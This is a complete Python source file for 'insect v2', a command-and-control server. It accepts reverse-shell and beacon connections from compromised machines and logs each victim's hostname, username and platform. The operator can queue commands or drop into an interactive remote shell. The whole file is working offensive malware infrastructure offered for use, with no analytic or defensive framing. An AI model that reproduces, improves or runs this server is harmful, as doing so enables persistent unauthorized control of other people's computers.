#!/usr/bin/env python3
#
# insect c2 server v2

import socket, sqlite3, threading, sys, os, time, select, struct

DB_PATH = "c2.db"

def init_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS sessions (
            id TEXT PRIMARY KEY, type TEXT, hostname TEXT,
            username TEXT, platform TEXT, beacon_id BLOB,
            addr TEXT, port INTEGER,
            first_seen REAL, last_seen REAL, status TEXT
        );
        CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT, command TEXT, status TEXT,
            result TEXT, created_at REAL, completed_at REAL
        );
    """)
    conn.commit()
    return conn

class colors:
    blue    = '\033[38;5;75m'
    green   = '\033[38;5;84m'
    yellow  = '\033[38;5;227m'
    red     = '\033[38;5;203m'
    magenta = '\033[38;5;170m'
    cyan    = '\033[38;5;81m'
    white   = '\033[38;5;231m'
    gray    = '\033[38;5;244m'
    bold    = '\033[1m'
    reset   = '\033[0m'

def log_info(msg):
    print(f"{colors.blue}[*]{colors.reset} {msg}")

def log_ok(msg):
    print(f"{colors.green}[+]{colors.reset} {msg}")

def log_error(msg):
    print(f"{colors.red}[-]{colors.reset} {msg}")

def print_banner():
    art = f"""{colors.green}{colors.bold}
  ⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣶⣶⣶⣤⡀
  ⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡿⠿⠿⣿⣿⣿⡄
  ⠀⠀⠀⠀⠀⠀⢸⡿⣛⡅⢸⣿⣷⣿⣿⣿⡇
  ⠀⠀⠀⠀⣀⠀⠘⣾⣿⣷⠀⢛⣵⣿⣿⡿⠃⠀⣀⡀⠀⠀⠀⠀
  ⠀⠀⠀⠀⣿⠀⠀⢹⢋⣴⣿⣿⣿⢟⣵⣾⣿⣿⣿⣿⣷⡀⠀⠀
  ⠀⠀⣤⡶⡿⢶⠀⠈⠻⡿⢛⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀𝙎𝙃𝙐𝙏
  ⠀⠀⢷⣿⣿⣿⡇⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀𝙐𝙋 !
  ⠀⠀⢸⣿⣿⣿⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀
  ⠀⠀⠀⢿⣿⣿⣇⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇
  ⠀⠀⠀⠘⣿⣿⣿⣧⣼⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
  ⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⡟⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
  ⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⡟⠁⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿
  ⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

           {colors.white}insect v2 c2 framework{colors.reset}
    """
    for line in art.splitlines():
        print(line)
        time.sleep(0.01)
    print("")

class Session:
    def __init__(self, sid, stype, conn=None, addr=None):
        self.id = sid
        self.type = stype
        self.conn = conn
        self.addr = addr
        self.hostname = ""
        self.username = ""
        self.platform = ""
        self.beacon_id = b""
        self.active = True
        self.lock = threading.Lock()

class C2Server:
    def __init__(self):
        self.db = init_db()
        self.sessions = {}
        self.slock = threading.Lock()
        self.running = True
        
        c = self.db.cursor()
        c.execute("UPDATE sessions SET status='closed' WHERE type='revshell' AND status='active'")
        self.db.commit()

    def _recvall(self, conn, n):
        data = bytearray()
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data.extend(packet)
        return data

    def reg_session(self, ses, is_new=True):
        with self.slock:
            self.sessions[ses.id] = ses
        
        if is_new:
            c = self.db.cursor()
            c.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?,?,?,?,?,?)",
                      (ses.id, ses.type, ses.hostname, ses.username, ses.platform,
                       ses.beacon_id, ses.addr[0] if ses.addr else "",
                       ses.addr[1] if ses.addr else 0,
                       time.time(), time.time(), "active"))
            self.db.commit()

    def unreg_session(self, sid):
        with self.slock:
            self.sessions.pop(sid, None)
        c = self.db.cursor()
        c.execute("UPDATE sessions SET status='closed', last_seen=? WHERE id=?", (time.time(), sid))
        self.db.commit()

    def start_listener(self, ltype, host, port):
        t = threading.Thread(target=self._listen, args=(ltype, host, port), daemon=True)
        t.start()
        log_info(f"{ltype} listener on {host}:{port}")

    def _listen(self, ltype, host, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        s.bind((host, port))
        s.listen(5)
        while self.running:
            try:
                c, a = s.accept()
                threading.Thread(target=self._handle_client, args=(c, a), daemon=True).start()
            except:
                break

    def _handle_client(self, conn, addr):
        try:
            conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            conn.settimeout(10.0)
            
            magic = conn.recv(1)
            if not magic:
                conn.close()
                return

            if magic == b'\x29': # start of routing tag (41)
                rest = 41
                while rest > 0:
                    chunk = conn.recv(rest)
                    if not chunk:
                        conn.close()
                        return
                    rest -= len(chunk)
                magic = conn.recv(1)

            conn.settimeout(None)

            if magic == b'\x02':
                self._revshell(conn, addr)
            elif magic == b'\x01':
                self._beacon(conn, addr)
            else:
                log_error(f"unknown payload magic: {magic} from {addr}")
                conn.close()
        except Exception as e:
            try:
                conn.close()
            except:
                pass

    def _revshell(self, conn, addr):
        try:
            bid = conn.recv(4)
            if not bid or len(bid) != 4:
                conn.close()
                return
            
            sid = f"rev-{bid.hex()}"
            
            c = self.db.cursor()
            c.execute("SELECT id FROM sessions WHERE id=?", (sid,))
            row = c.fetchone()
            
            if row:
                c.execute("UPDATE sessions SET status='active', port=?, last_seen=? WHERE id=?", (addr[1], time.time(), sid))
                self.db.commit()
                log_ok(f"revshell {sid} reconnected from {addr[0]}:{addr[1]}")
                is_new = False
            else:
                log_ok(f"new revshell {sid} from {addr[0]}:{addr[1]}")
                is_new = True
                
            ses = Session(sid, "revshell", conn, addr)
            conn.sendall(b"\xde\xad")
            self.reg_session(ses, is_new=is_new)

            while ses.active:
                time.sleep(0.5)
        except Exception as e:
            log_error(f"revshell handler exception: {e}")
            pass
        finally:
            try:
                conn.close()
            except:
                pass
            self.unreg_session(sid)

    def _beacon(self, conn, addr):
        ses = None
        sid = ""
        try:
            bid = conn.recv(4)
            hl = ord(conn.recv(1))
            hn = conn.recv(hl).decode()
            ul = ord(conn.recv(1))
            un = conn.recv(ul).decode()
            pl = ord(conn.recv(1))
            pf = conn.recv(pl).decode()

            sid = f"bea-{bid.hex()}"
            with self.slock:
                ses = self.sessions.get(sid)

            if ses:
                ses.conn = conn
                ses.addr = addr
                ses.active = True
                c = self.db.cursor()
                c.execute("UPDATE sessions SET status='active', last_seen=? WHERE id=?", (time.time(), sid))
                self.db.commit()
                # Silently update last_seen, no spam
            else:
                ses = Session(sid, "beacon", conn, addr)
                ses.beacon_id = bid
                ses.hostname = hn
                ses.username = un
                ses.platform = pf
                self.reg_session(ses)
                log_ok(f"beacon {sid} from {addr[0]}:{addr[1]} ({hn}/{un})")

            c = self.db.cursor()
            c.execute("SELECT id, command FROM tasks WHERE session_id=? AND status='pending' ORDER BY id LIMIT 1", (sid,))
            task = c.fetchone()

            if task:
                tid, cmd = task
                cdb = cmd.encode()
                conn.sendall(struct.pack(">BI", 1, tid) + cdb)
                resp = conn.recv(1)
                if resp == b'\x02':
                    rid_bytes = self._recvall(conn, 4)
                    if not rid_bytes: return
                    rid = struct.unpack(">I", rid_bytes)[0]
                    st = ord(conn.recv(1))
                    ol_bytes = self._recvall(conn, 4)
                    if not ol_bytes: return
                    ol = struct.unpack(">I", ol_bytes)[0]
                    
                    out = ""
                    if ol > 0:
                        out_bytes = self._recvall(conn, ol)
                        if out_bytes: out = out_bytes.decode(errors='replace')

                    c.execute("UPDATE tasks SET status=?, result=?, completed_at=? WHERE id=?",
                              ("completed", out, time.time(), rid))
                    self.db.commit()
                    print(f"\n{colors.green}[+] Task {rid} Output ({sid}):{colors.reset}\n{out.strip()}\n")
            else:
                conn.sendall(b'\x00')
        except Exception as e:
            log_error(f"beacon {sid} error: {e}")
        finally:
            try:
                conn.close()
            except:
                pass
            if ses:
                ses.active = False

    def _interact(self, ses):
        conn = ses.conn
        ses.lock.acquire()
        closed = False
        try:
            try:
                conn.sendall(b"") 
            except:
                ses.active = False
                log_error("Session is dead.")
                return

            print(f"\n{colors.magenta}┌──({colors.white}insect-shell{colors.magenta})─[{colors.white}{ses.id}{colors.magenta}]")
            print(f"└─{colors.gray} Type 'exit' to return to console{colors.reset}\n")
            
            try:
                bootstrap = b"export TERM=xterm-256color; export PS1='# '; \n"
                conn.sendall(bootstrap)
            except:
                pass

            conn.setblocking(True)

            while ses.active:
                r, _, _ = select.select([conn, sys.stdin], [], [], 0.1)
                if conn in r:
                    try:
                        d = conn.recv(8192)
                        if not d:
                            log_info("connection closed by target")
                            closed = True
                            break
                        sys.stdout.write(d.decode(errors='replace'))
                        sys.stdout.flush()
                    except Exception as e:
                        log_error(f"connection error: {e}")
                        closed = True
                        break
                if sys.stdin in r:
                    l = sys.stdin.readline()
                    if not l: break
                    if l.strip().lower() in ("exit", "quit", "bg"):
                        break
                    try:
                        conn.sendall(l.encode())
                    except:
                        closed = True
                        break
        except KeyboardInterrupt:
            pass
        finally:
            print(f"\n{colors.yellow}--- detached from {ses.id} ---{colors.reset}")
            ses.lock.release()
            if closed or not ses.active:
                self.unreg_session(ses.id)
                ses.active = False

    def cmd_list(self, _):
        c = self.db.cursor()
        c.execute("SELECT id, type, addr, port, hostname, username, platform, status, last_seen FROM sessions ORDER BY last_seen DESC")
        rows = c.fetchall()
        
        if not rows:
            log_info("No active sessions in database.")
            return
            
        header = f"  {'ID':20} │ {'TYPE':10} │ {'ADDR':20} │ {'USER@HOST':25} │ {'STATUS':8}"
        sep    = f"  {'─'*20}─┼─{'─'*10}─┼─{'─'*20}─┼─{'─'*25}─┼─{'─'*8}"
        
        print(f"\n{colors.gray}{header}{colors.reset}")
        print(f"{colors.gray}{sep}{colors.reset}")
        
        for r in rows:
            sid, stype, addr, port, hn, un, pf, status, last_seen = r
            a = f"{addr}:{port}" if addr else "detached"
            uh = f"{un}@{hn}" if (un or hn) else "unknown"
            
            if stype == "beacon" and (time.time() - last_seen) > 120:
                status = "offline"
                
            color = colors.green if status == 'active' else (colors.red if status == 'closed' else colors.yellow)
            
            print(f"  {color}{sid:20}{colors.reset} {colors.gray}│{colors.reset} {stype:10} {colors.gray}│{colors.reset} {a:20} {colors.gray}│{colors.reset} {uh:25} {colors.gray}│{colors.reset} {color}{status:8}{colors.reset}")
        print("")

    def cmd_use(self, args):
        if len(args) < 2:
            print("usage: use <session_id>")
            return
        sid = args[1]
        
        with self.slock:
            ses = self.sessions.get(sid)
            
        if ses:
            if ses.type == "revshell":
                log_info(f"entering interactive shell for {ses.id}  (type exit/bg to return)")
                self._interact(ses)
            else:
                self._beacon_interact(ses.id)
            return
            
        c = self.db.cursor()
        c.execute("SELECT type, status FROM sessions WHERE id=?", (sid,))
        row = c.fetchone()
        
        if not row:
            print("session not found")
            return
            
        stype, status = row
        if stype == "revshell":
            print(f"revshell {sid} is dead (server restarted or connection dropped)")
        elif stype == "beacon":
            self._beacon_interact(sid)

    def _beacon_interact(self, sid):
        log_info(f"entering beacon context for {sid} (type 'bg' or 'exit' to return)")
        print(f"{colors.cyan}[i] Commands are queued and run when the beacon checks in.{colors.reset}")
        
        while self.running:
            try:
                inp = input(f"{colors.cyan}({sid}){colors.reset} c2> ").strip()
                if not inp: continue
                if inp.lower() in ("exit", "quit", "bg"):
                    break
                if inp.lower() == "tasks":
                    self.cmd_tasks(["tasks", sid])
                    continue
                if inp.lower() == "clear":
                    os.system("clear")
                    continue
                
                # Queue the task directly
                c = self.db.cursor()
                c.execute("INSERT INTO tasks (session_id, command, status, created_at) VALUES (?,?,?,?)",
                          (sid, inp, "pending", time.time()))
                self.db.commit()
                log_ok(f"Task queued. It will execute on next check-in.")
            except KeyboardInterrupt:
                break
        
        print(f"\n{colors.yellow}--- detached from {sid} ---{colors.reset}")

    def cmd_task(self, args):
        if len(args) < 3:
            print("usage: task <session_id> <command>")
            return
        sid = args[1]
        cmd = " ".join(args[2:])
        c = self.db.cursor()
        c.execute("INSERT INTO tasks (session_id, command, status, created_at) VALUES (?,?,?,?)",
                  (sid, cmd, "pending", time.time()))
        self.db.commit()
        print(f"task queued for {sid}")

    def cmd_tasks(self, args):
        if len(args) < 2:
            print("usage: tasks <session_id>")
            return
        c = self.db.cursor()
        c.execute("SELECT id, command, status, result, created_at FROM tasks WHERE session_id=? ORDER BY id", (args[1],))
        rows = c.fetchall()
        if not rows:
            print("no tasks")
            return
        for r in rows:
            ts = time.strftime("%H:%M:%S", time.localtime(r[4]))
            print(f"  #{r[0]:3} [{ts}] {r[1][:60]:60} [{r[2]}]")
            if r[2] == "completed" and r[3]:
                out = r[3][:300].replace("\n", "\\n")
                print(f"       output: {out}")

    def cmd_delete(self, args):
        if len(args) < 2:
            print("usage: rm <session_id>|all")
            return
        
        sid = args[1]
        c = self.db.cursor()
        
        if sid.lower() == "all":
            c.execute("DELETE FROM sessions")
            c.execute("DELETE FROM tasks")
            self.db.commit()
            
            with self.slock:
                for s in self.sessions.values():
                    if s.conn:
                        try: s.conn.close()
                        except: pass
                self.sessions.clear()
            log_ok("all sessions deleted from database and memory")
        else:
            c.execute("DELETE FROM sessions WHERE id=?", (sid,))
            c.execute("DELETE FROM tasks WHERE session_id=?", (sid,))
            self.db.commit()
            
            with self.slock:
                ses = self.sessions.pop(sid, None)
                if ses and ses.conn:
                    try: ses.conn.close()
                    except: pass
            log_ok(f"deleted session {sid}")

    def cmd_listen(self, args):
        if len(args) < 4:
            print("usage: listen <type> <host> <port>")
            return
        self.start_listener(args[1], args[2], int(args[3]))

    def cmd_help(self, _):
        print(f"\n{colors.bold}Core Commands:{colors.reset}")
        print(f"  list / ls         - List active sessions")
        print(f"  use <id>          - Interact with a session (revshell or beacon)")
        print(f"  rm / delete <id>  - Delete a session (or 'all')")
        print(f"  task <id> <cmd>   - Queue a command for a beacon manually")
        print(f"  tasks <id>        - View task history for a beacon")
        print(f"  clear             - Clear terminal")
        print(f"  help              - Show this menu")
        print(f"  exit / quit       - Exit the C2 server\n")

    def console(self):
        print_banner()
        dispatch = {
            "list": self.cmd_list, "ls": self.cmd_list,
            "use": self.cmd_use,
            "rm": self.cmd_delete, "delete": self.cmd_delete,
            "task": self.cmd_task,
            "tasks": self.cmd_tasks,
            "listen": self.cmd_listen,
            "help": self.cmd_help, "?": self.cmd_help,
            "clear": lambda _: os.system("clear"),
        }
        while self.running:
            try:
                prompt = f"{colors.gray}({colors.magenta}insect{colors.gray}) > {colors.reset}"
                inp = input(prompt).strip()
                if not inp:
                    continue
                parts = inp.split()
                if parts[0] in ("exit", "quit"):
                    self.running = False
                    break
                elif parts[0] in dispatch:
                    dispatch[parts[0]](parts)
                else:
                    self.cmd_help(None)
            except KeyboardInterrupt:
                self.running = False
            except Exception:
                pass

    def run(self):
        self.start_listener("revshell", "0.0.0.0", 8080)
        self.console()


if __name__ == "__main__":
    C2Server().run()
